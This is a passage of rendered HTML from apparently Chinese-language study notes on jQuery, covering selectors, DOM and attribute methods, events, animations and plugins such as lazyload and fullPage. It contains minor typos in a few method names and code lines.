id="jQuery入口函数2（简化）"><a href="#jQuery入口函数2（简化）" class="headerlink" title="jQuery入口函数2（简化）"></a>jQuery入口函数2（简化）</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;...&#125;);</span><br></pre></td></tr></table></figure><h3 id="符实质"><a href="#符实质" class="headerlink" title="$符实质"></a>$符实质</h3><ul><li>$实质是一个函数，jQuery 对象是类数组对象。</li><li>参数是 function 、把 dom 元素 document 转成 jQuery 对象，选择器</li></ul><blockquote><p>jQuery 的调用方式</p></blockquote><p>第一种：传递 CSS 选择器（字符串）给 <code>$()</code> 方法。 选择器支持大部分 CSS3 选择器，也有自己扩展的。返回当前文档中匹配该选择器的元素集合。还可以将一个 jQuery 对象作为第二个参数传递给 <code>$()</code> 方法，返回该特定元素或元素子元素中匹配选择器的部分。第二个元素可选的。</p><p>第二种：传递一个 Element、Document 或 Window 对象给 <code>$()</code> 方法。将传入的内容封装成 jQuery 对象。</p><p>第三种：传递 HTML 文本字符串，会根据传入的文本创建好 HTML 元素并封装为 jQuery 对象返回。可以接收第二个参数，可以传递 Document 对象来指定与所创建元素相关联的文档。第二个参数还可以是 object 对象。</p><p>第四中：传入函数。</p><h2 id="一些基础方法"><a href="#一些基础方法" class="headerlink" title="一些基础方法"></a>一些基础方法</h2><ul><li><code>size()</code> 代替 <code>length</code></li><li><code>get()</code> 代替方括号索引</li><li><code>toArray()</code> 将 <code>jQuery</code> 对象转成真正数组</li><li><code>each()</code> 遍历，代替 for 循环<ul><li>参数是回调函数，回调函数中的 this 指向遍历的元素，是原生的 DOM 对象。</li><li>还可以将索引，该元素传递给回调函数的第一个和第二个参数，第二个参数也是 DOM 对象。</li><li>返回调用自身的 jQuery 对象，可以用于链式编程</li></ul></li><li><code>map()</code> 和 <code>Array.prototype.map()</code> 方法很接近。<ul><li>接收回调函数作为参数；</li><li>索引是回调函数的第一个参数，元素作为 this 值和回调函数的第二个参数。</li><li>如果回调函数返回 null 或 undefined，索引忽略。</li><li>回调函数返回数组或者伪数组</li><li>map() 返回的 jQuery 对象可以不包括文档元素，但依旧可以像伪数组对象一样使用。</li></ul></li><li><code>index()</code> 接收一个参数，返回该元素在 jQuery 对象中的索引值。找不到返回 -1.</li><li><code>is()</code> 接收一个选择器，选中元素至少有一个匹配该选择器，返回 true。</li></ul><p>jQuery 对象的三个属性</p><ul><li><code>selector</code> 选择器字符串</li><li><code>context</code> 传递给 <code>$()</code> 的第二个参数</li><li><code>jquery</code> jQuery 的版本号</li></ul><h2 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h2><h3 id="基本选择器"><a href="#基本选择器" class="headerlink" title="基本选择器"></a>基本选择器</h3><ul><li>ID选择器 <code>$(&quot;#id名&quot;);</code></li><li>类选择器 <code>$(&quot;.类名&quot;);</code></li><li>标签选择器 <code>$(&quot;标签名&quot;);</code></li><li>并集选择器 <code>$(&quot;#curr,.cls&quot;);</code></li><li>交集选择器 <code>$(&quot;li.cls&quot;);</code></li></ul><h3 id="层级选择器"><a href="#层级选择器" class="headerlink" title="层级选择器"></a>层级选择器</h3><ul><li>子代选择器 <code>$(&quot;#curr&gt;.cls&quot;)</code></li><li>后代选择器 <code>$(&quot;li cls&quot;)</code></li></ul><h3 id="过滤选择器"><a href="#过滤选择器" class="headerlink" title="过滤选择器"></a>过滤选择器</h3><ul><li><code>:odd;</code></li><li><code>:even;</code></li><li><code>:eq(0);</code><ul><li>jQuery对象</li></ul></li></ul><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ul><li><code>$(this).css(&quot;backgroundColor&quot;, &quot;pink&quot;).siblings(&quot;li&quot;).css(&quot;backgroundColor&quot;, &quot;&quot;);</code><ul><li>链式编程</li></ul></li><li><code>$(this).find(&quot;li&quot;).css(&quot;backgroundColor&quot;, &quot;&quot;);</code></li><li><code>css({});</code><ul><li>css设置样式</li></ul></li><li><code>siblings();</code><ul><li>兄弟元素</li></ul></li><li><code>find();</code><ul><li>后代元素</li></ul></li><li><code>next();</code><ul><li>下一个兄弟元素</li></ul></li><li><code>parent();</code><ul><li>父元素</li></ul></li><li><code>show();</code><ul><li>显示</li></ul></li><li><code>hide();</code><ul><li>隐藏</li></ul></li><li><code>index();</code><ul><li>获取的是当前对象在它兄弟里面的索引/</li></ul></li><li><code>eq(0);</code><ul><li>取到的是jQuery对象</li></ul></li></ul><h2 id="隐式迭代"><a href="#隐式迭代" class="headerlink" title="隐式迭代"></a>隐式迭代</h2><ul><li>设置属性的操作的时候设置的是所有的元素</li><li>获取性操作不去遍历，直接获取第一个</li></ul><h2 id="类操作"><a href="#类操作" class="headerlink" title="类操作"></a>类操作</h2><ul><li>添加类 <code>addClass();</code><ul><li>类名</li></ul></li><li>移除类 <code>removeClass();</code><ul><li>类名</li></ul></li><li>判断类 <code>hasClass();</code><ul><li>类名</li></ul></li><li>切换 <code>toggle();</code><ul><li>类名，两个类名之间切换操作</li></ul></li></ul><h2 id="动画"><a href="#动画" class="headerlink" title="动画"></a>动画</h2><h3 id="显示、隐藏"><a href="#显示、隐藏" class="headerlink" title="显示、隐藏"></a>显示、隐藏</h3><ul><li>show(); hide(); toggle();<ul><li>参数speed,值为毫秒值</li></ul></li></ul><h3 id="淡入、淡出"><a href="#淡入、淡出" class="headerlink" title="淡入、淡出"></a>淡入、淡出</h3><ul><li>fadeIn(); fadeIn(); fadeToggle()；<ul><li>不传参数的时候，有动画，normal;</li></ul></li></ul><h3 id="滑入、滑出"><a href="#滑入、滑出" class="headerlink" title="滑入、滑出"></a>滑入、滑出</h3><ul><li>slideUp(); slideUp(); slideToggle()；<ul><li>不传参数的时候，有动画，normal;</li></ul></li></ul><h3 id="自定义动画"><a href="#自定义动画" class="headerlink" title="自定义动画"></a>自定义动画</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#box"</span>).animate(&#123;<span class="string">"width"</span>:<span class="string">"400px"</span>,<span class="string">"height"</span>:<span class="string">"400px"</span>, <span class="string">"left"</span>:<span class="string">"400px"</span>&#125;,speed,easing);</span><br></pre></td></tr></table></figure><h3 id="停止动画-stop"><a href="#停止动画-stop" class="headerlink" title="停止动画 stop();"></a>停止动画 <code>stop();</code></h3><ul><li>stop(clearQueue, jumpToEnd);<ul><li>第一个参数是否清除动画队列 true, false，默认false;第二个参数是是否跳转到当前动画的最终效果 true, false</li></ul></li></ul><h2 id="jQuery和js节点操作"><a href="#jQuery和js节点操作" class="headerlink" title="jQuery和js节点操作"></a>jQuery和js节点操作</h2><h3 id="js节点操作"><a href="#js节点操作" class="headerlink" title="js节点操作"></a>js节点操作</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> box = <span class="built_in">document</span>.getElementById(<span class="string">"box"</span>);</span><br><span class="line">aNode.document.createElement(<span class="string">"a"</span>);</span><br><span class="line">box.appendChild(aNode);</span><br><span class="line">aNode.innerHTML = <span class="string">"innerHtml"</span>;</span><br></pre></td></tr></table></figure><h3 id="jQuery-操作"><a href="#jQuery-操作" class="headerlink" title="jQuery 操作"></a>jQuery 操作</h3><ul><li><code>append();</code><ul><li>添加节点</li></ul></li><li><code>appendTo()</code><ul><li>添加节点</li></ul></li><li><code>prepend();</code><ul><li>添加节点</li></ul></li><li><code>prependTo()</code><ul><li>添加节点</li></ul></li><li><code>after();</code><ul><li>添加节点</li></ul></li><li><code>before();</code><ul><li>添加节点</li></ul></li><li><code>insertAfter()</code><ul><li>插入节点</li></ul></li><li><code>insertBefore()</code><ul><li>插入节点</li></ul></li><li><code>replaceWith()</code><ul><li>替换</li></ul></li><li><code>add()</code><ul><li>添加</li></ul></li><li><code>first()</code><ul><li>仅包含选中元素的第一个</li></ul></li><li><code>eq()</code><ul><li>只包含指定序号的单个元素</li></ul></li><li><code>html();</code><ul><li>不传参获取，传参设置</li></ul></li><li><code>text();</code><ul><li>不传参获取，传参设置</li></ul></li><li><code>empty();</code><ul><li>清空节点（清理门户）</li></ul></li><li><code>remove();</code><ul><li>删除节点（自杀）</li></ul></li><li><code>clone();</code><ul><li>深度复制，不复制事件</li></ul></li><li><code>clone(true);</code><ul><li>深度复制，并且复制事件</li></ul></li><li><code>val();</code><ul><li>获取值</li></ul></li><li><code>val(&quot;abc&quot;);</code><ul><li>设置值</li></ul></li><li><code>next()</code><ul><li>下一个节点</li></ul></li><li><code>prev()</code><ul><li>上一个节点</li></ul></li><li><code>prevAll()</code><ul><li>前面所有节点</li></ul></li><li><code>nextAll()</code><ul><li>后面所有节点</li></ul></li><li><code>parent()</code><ul><li>父节点</li></ul></li><li><code>sibling()</code><ul><li>兄弟节点</li></ul></li><li><code>find()</code><ul><li>后代节点</li></ul></li><li><code>filer()</code><ul><li>返回符合条件的jQuery对象</li></ul></li><li><code>not()</code><ul><li>排除元素</li></ul></li><li><code>has()</code><ul><li>是否有</li></ul></li><li><code>gt()</code><ul><li>参数是数字，返回大于参数的后面的元素</li></ul></li><li><code>wrap()</code><ul><li>包装每一个</li></ul></li><li><code>wrapInner()</code><ul><li>包装每一个元素的内容</li></ul></li><li><code>wrapOuter()</code><ul><li>将选中元素作为一组包装</li></ul></li></ul><h3 id="jQuery属性操作"><a href="#jQuery属性操作" class="headerlink" title="jQuery属性操作"></a>jQuery属性操作</h3><ul><li><code>setAttribute(&quot;target&quot;, &quot;_blank&quot;);</code></li><li><code>attr(&quot;title&quot;, &quot;星期四&quot;);</code><ul><li>用法和css用法是一样</li></ul></li><li><code>attr(name, value);</code><ul><li>用法和css用法是一样</li></ul></li><li><code>attr({json});</code><ul><li>用法和css用法是一样</li></ul></li><li><code>css()</code><ul><li>传入一个字符串参数，获取对应样式，注意，不能传入复合样式的属性，如 “font”</li><li>传入两个参数，设置样式</li><li>传入一个对象，设置样式</li></ul></li></ul><h3 id="jQuery属性操作特例"><a href="#jQuery属性操作特例" class="headerlink" title="jQuery属性操作特例"></a>jQuery属性操作特例</h3><p>布尔类型的属性：<code>true</code> <code>false</code></p><ul><li><code>checked</code></li><li><code>selected</code></li><li><code>disabled</code></li></ul><p>在jquery里面，碰到布尔类型的属性的时候，不要用attr方法，应该prop方法</p><ul><li><code>prop(&quot;checked&quot;);</code><ul><li>用法和css用法是一样</li></ul></li></ul><h3 id="jQuery获取属性值width系列（操作尺寸）"><a href="#jQuery获取属性值width系列（操作尺寸）" class="headerlink" title="jQuery获取属性值width系列（操作尺寸）"></a>jQuery获取属性值width系列（操作尺寸）</h3><ul><li><code>width();</code><ul><li>能获取、设置</li></ul></li><li><code>Innerwidth();</code><ul><li>获取内部宽度（包括宽度和padding）</li></ul></li><li><code>Outerwidth();</code><ul><li>获取内部宽度（包括宽度和padding和border）</li></ul></li><li><code>Outerwidth(true);</code><ul><li>获取内部宽度（包括宽度和padding和border和margin）</li></ul></li><li><code>height();</code><ul><li>能获取、设置</li></ul></li><li><code>Innerheight();</code><ul><li>获取内部高度（包括高度和 padding）</li></ul></li><li><code>Outerheight();</code><ul><li>获取内部高度（包括高度和 padding 和 border）</li></ul></li><li><code>Outerheight(true);</code><ul><li>获取内部高度（包括高度和 padding 和 border 和 margin）</li></ul></li></ul><h3 id="jQuery操作坐标"><a href="#jQuery操作坐标" class="headerlink" title="jQuery操作坐标"></a>jQuery操作坐标</h3><ul><li><code>position();</code><ul><li>只能获取不能设置，设置用 css 设置，找最近的有相对定位的的父盒子</li></ul></li><li><code>offset();</code><ul><li>相对与dom最左上角（获取、设置）</li><li>带有 left 属性和 top 属性</li></ul></li><li><code>offsetParent()</code><ul><li>最近定位的祖先元素</li></ul></li><li><code>scrollTop();</code> <ul><li>设置卷去的距离（事件）</li></ul></li><li><code>scrollLeft();</code><ul><li>设置卷去的距离（事件）</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">window</span>).scroll(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  $(<span class="keyword">this</span>).scrollTop();</span><br><span class="line">  $(<span class="keyword">this</span>).scrollLeft();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="获取和设置-CSS-类"><a href="#获取和设置-CSS-类" class="headerlink" title="获取和设置 CSS 类"></a>获取和设置 CSS 类</h3><ul><li><code>addClass()</code><ul><li>添加类</li></ul></li><li><code>removeClass()</code><ul><li>删除类</li></ul></li><li><code>toggleClass()</code><ul><li>没有类则添加，否则删除</li></ul></li><li><code>hasClass()</code><ul><li>判断是否存在</li></ul></li></ul><h3 id="设置或获取元素内容"><a href="#设置或获取元素内容" class="headerlink" title="设置或获取元素内容"></a>设置或获取元素内容</h3><ul><li><code>html()</code><ul><li>不传参获取</li><li>传参设置值，html格式字符串</li></ul></li><li><p><code>text()</code></p><ul><li>不传参获取</li><li>传参设置值，纯文本<h2 id="jQuery事件"><a href="#jQuery事件" class="headerlink" title="jQuery事件"></a>jQuery事件</h2></li></ul></li><li><p>事件机制：</p><ul><li>用户执行某一个操作，浏览器会相应用户的操作，执行某个函数</li></ul></li><li>事件处理函数：<ul><li>所谓的事件处理函数，就是响应用户的那个函数</li></ul></li><li>用户事件：<ul><li>就是事件名，用户可以注册的事件</li></ul></li><li>注册事件：<ul><li>就是赋值或调用addEventListener</li></ul></li><li>响应事件：<ul><li>做完操作调用某个方法</li></ul></li></ul><h3 id="jQuery事件发展"><a href="#jQuery事件发展" class="headerlink" title="jQuery事件发展"></a>jQuery事件发展</h3><blockquote><p>简单事件绑定：不能同时注册两个事件</p></blockquote><p>bind事件绑定</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"p"</span>).bind(&#123;</span><br><span class="line">   <span class="string">"click"</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(<span class="string">"我执行了click"</span>);</span><br><span class="line">   &#125;,<span class="string">"mouseenter"</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(<span class="string">"我执行了mouseenter"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>不支持动态创建元素</p><blockquote><p>delegate事件（委托、委派、代理）</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"div"</span>).delegate(<span class="string">"p"</span>, <span class="string">"click"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">"我执行了委托事件"</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="on事件绑定"><a href="#on事件绑定" class="headerlink" title="on事件绑定"></a>on事件绑定</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*on给div注册委托事件*/</span></span><br><span class="line">$(<span class="string">"div"</span>).on(<span class="string">"click"</span>, <span class="string">"p"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">&#125;); </span><br><span class="line"><span class="comment">/*on给div注册普通的点击事件*/</span></span><br><span class="line">$(<span class="string">"div"</span>).on(<span class="string">"click"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">"我触发了div本身的事件"</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="解除事件绑定"><a href="#解除事件绑定" class="headerlink" title="解除事件绑定"></a>解除事件绑定</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*off是解除所有的事件,能解除委托事件*/</span></span><br><span class="line">$(<span class="string">"div"</span>).off();</span><br><span class="line"><span class="comment">/*解除click事件*/</span></span><br><span class="line">$(<span class="string">"div"</span>).off(<span class="string">"click"</span>);</span><br><span class="line"><span class="comment">/*解除委托的click事件*/</span></span><br><span class="line">$(<span class="string">"div"</span>).off(<span class="string">"click"</span>,<span class="string">"**"</span>);</span><br></pre></td></tr></table></figure><h3 id="事件触发"><a href="#事件触发" class="headerlink" title="事件触发"></a>事件触发</h3><ul><li><code>trigger(&quot;focus&quot;);</code><ul><li>触发获取焦点事件，会触发浏览器默认行为</li></ul></li><li><code>triggerHandler(&quot;focus&quot;);</code><ul><li>触发获取焦点事件，不会触发浏览器默认行为</li></ul></li></ul><h3 id="事件对象event"><a href="#事件对象event" class="headerlink" title="事件对象event"></a>事件对象event</h3><ul><li><code>click(function(event){...});</code><ul><li>点击</li></ul></li><li><code>keyCode = event.keyCode;</code><ul><li>键盘码</li></ul></li></ul><h3 id="阻止事件冒泡"><a href="#阻止事件冒泡" class="headerlink" title="阻止事件冒泡"></a>阻止事件冒泡</h3><p>方法1：</p><ul><li><code>event.stopPropagation();</code></li></ul><p>方法2：</p><ul><li><code>return false;</code></li></ul><h3 id="阻止浏览器的默认行为"><a href="#阻止浏览器的默认行为" class="headerlink" title="阻止浏览器的默认行为"></a>阻止浏览器的默认行为</h3><p>方法1：</p><ul><li><code>event.preventDefault();</code></li></ul><p>方法2：</p><ul><li><code>return false;</code></li></ul><h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><ul><li><code>click(function(){...});</code><ul><li>点击</li></ul></li><li><code>scroll(function(){...});</code><ul><li>鼠标滚轮事件</li></ul></li><li><code>focus(function(){...});</code><ul><li>获取焦点</li></ul></li><li><code>mouseenter(function(){...});</code><ul><li>鼠标经过</li></ul></li><li><code>mouseleave(function(){...});</code><ul><li>鼠标离开</li></ul></li><li><code>keydown(function(event){var keyCode = event.keyCode;});</code><ul><li>键盘按键按下</li></ul></li><li><code>keyup(function(event){var keyCode = event.keyCode;});</code><ul><li>键盘抬起</li></ul></li></ul><h3 id="浏览器提供的事件"><a href="#浏览器提供的事件" class="headerlink" title="浏览器提供的事件"></a>浏览器提供的事件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"onabort"</span>, <span class="string">"onblur"</span>, <span class="string">"oncancel"</span>, <span class="string">"oncanplay"</span>, </span><br><span class="line"><span class="string">"oncanplaythrough"</span>, <span class="string">"onchange"</span>, <span class="string">"onclick"</span>, <span class="string">"onclose"</span>,</span><br><span class="line"><span class="string">"oncontextmenu"</span>, <span class="string">"oncuechange"</span>, <span class="string">"ondblclick"</span>, <span class="string">"ondrag"</span>, </span><br><span class="line"><span class="string">"ondragend"</span>, <span class="string">"ondragenter"</span>, <span class="string">"ondragleave"</span>, <span class="string">"ondragover"</span>,</span><br><span class="line"><span class="string">"ondragstart"</span>, <span class="string">"ondrop"</span>, <span class="string">"ondurationchange"</span>, <span class="string">"onemptied"</span>,</span><br><span class="line"><span class="string">"onended"</span>, <span class="string">"onerror"</span>, <span class="string">"onfocus"</span>, <span class="string">"oninput"</span>, <span class="string">"oninvalid"</span>, </span><br><span class="line"><span class="string">"onkeydown"</span>, <span class="string">"onkeypress"</span>, <span class="string">"onkeyup"</span>, <span class="string">"onload"</span>,</span><br><span class="line"><span class="string">"onloadeddata"</span>, <span class="string">"onloadedmetadata"</span>, <span class="string">"onloadstart"</span>, <span class="string">"onmousedown"</span>, </span><br><span class="line"><span class="string">"onmouseenter"</span>, <span class="string">"onmouseleave"</span>, <span class="string">"onmousemove"</span>, <span class="string">"onmouseout"</span>, </span><br><span class="line"><span class="string">"onmouseover"</span>, <span class="string">"onmouseup"</span>, <span class="string">"onmousewheel"</span>, <span class="string">"onpause"</span>, </span><br><span class="line"><span class="string">"onplay"</span>, <span class="string">"onplaying"</span>, <span class="string">"onprogress"</span>, <span class="string">"onratechange"</span>, </span><br><span class="line"><span class="string">"onreset"</span>, <span class="string">"onresize"</span>, <span class="string">"onscroll"</span>, <span class="string">"onseeked"</span>, </span><br><span class="line"><span class="string">"onseeking"</span>, <span class="string">"onselect"</span>, <span class="string">"onshow"</span>, <span class="string">"onstalled"</span>, </span><br><span class="line"><span class="string">"onsubmit"</span>, <span class="string">"onsuspend"</span>, <span class="string">"ontimeupdate"</span>, <span class="string">"ontoggle"</span>, </span><br><span class="line"><span class="string">"onvolumechange"</span>, <span class="string">"onwaiting"</span>, <span class="string">"onbeforecopy"</span>, <span class="string">"onbeforecut"</span>, </span><br><span class="line"><span class="string">"onbeforepaste"</span>, <span class="string">"oncopy"</span>, <span class="string">"oncut"</span>, <span class="string">"onpaste"</span>, </span><br><span class="line"><span class="string">"onsearch"</span>, <span class="string">"onselectstart"</span>, <span class="string">"onwheel"</span>, <span class="string">"onwebkitfullscreenchange"</span>, </span><br><span class="line"><span class="string">"onwebkitfullscreenerror"</span></span><br></pre></td></tr></table></figure><h2 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*显式迭代：对每一个元素做不同的处理*/</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; $(<span class="string">"li"</span>).length; i++) &#123;</span><br><span class="line">  <span class="keyword">var</span> target = (i + <span class="number">1</span>) / <span class="number">10</span>;</span><br><span class="line">  $(<span class="string">"li"</span>).eq(i).css(<span class="string">"opacity"</span>, target);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*each();*/</span></span><br><span class="line">$(<span class="string">"li"</span>).each(<span class="function"><span class="keyword">function</span> (<span class="params">index, element</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> target = (index + <span class="number">1</span>) / <span class="number">10</span>;</span><br><span class="line">  $(element).css(<span class="string">"opacity"</span>, target);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><h3 id="懒加载插件"><a href="#懒加载插件" class="headerlink" title="懒加载插件"></a>懒加载插件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="class"><span class="keyword">class</span></span>=<span class="string">"lazy"</span> data-original=<span class="string">"23.jpg"</span> alt=<span class="string">""</span>&gt;</span><br><span class="line">&lt;script src=<span class="string">"jquery-1.12.4.js"</span> type=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"plugins/jquery.lazyload.js"</span> type=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;$(<span class="string">"img.lazy"</span>).lazyload();&#125;);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="fullpage插件"><a href="#fullpage插件" class="headerlink" title="fullpage插件"></a>fullpage插件</h3><h4 id="引入文件"><a href="#引入文件" class="headerlink" title="引入文件"></a>引入文件</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/jquery.fullPage.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/jquery.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/jquery-ui.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/jquery.fullPage.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="html"><a href="#html" class="headerlink" title="html"></a>html</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"fullpage"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"section"</span>&gt;</span>第一屏<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"section"</span>&gt;</span>第二屏<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"section"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"slide"</span>&gt;</span>第三屏的第一屏<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"slide"</span>&gt;</span>第三屏的第二屏<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"slide"</span>&gt;</span>第三屏的第三屏<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"slide"</span>&gt;</span>第三屏的第四屏<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"section"</span>&gt;</span>第四屏<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="js"><a href="#js" class="headerlink" title="js"></a>js</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  $(<span class="string">'#fullpage'</span>).fullpage(&#123;</span><br><span class="line">    <span class="string">'verticalCentered'</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">'css3'</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">'sectionsColor'</span>: [<span class="string">'#254875'</span>, <span class="string">'#00FF00'</span>, <span class="string">'#254587'</span>, <span class="string">'#695684'</span>],</span><br><span class="line">    anchors: [<span class="string">'page1'</span>, <span class="string">'page2'</span>, <span class="string">'page3'</span>, <span class="string">'page4'</span>],</span><br><span class="line">    <span class="string">'navigation'</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">'navigationPosition'</span>: <span class="string">'right'</span>,</span><br><span class="line">    <span class="string">'navigationTooltips'</span>: [<span class="string">'fullPage.js'</span>, <span class="string">'Powerful'</span>, <span class="string">'Amazing'</span>, <span class="string">'Simple'</span>]</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="可选配置"><a href="#可选配置" class="headerlink" title="可选配置"></a>可选配置</h4><ul><li>选项</li><li>方法</li><li>回调函数</li></ul><h3 id="jqueryUI插件"><a href="#jqueryUI插件" class="headerlink" title="jqueryUI插件"></a>jqueryUI插件</h3><p><a href="http://jqueryui.com/" target="_blank" rel="noopener">jqueryUI插件 官网</a></p><h4 id="引入文件-1"><a href="#引入文件-1" class="headerlink" title="引入文件"></a>引入文件</h4><figure 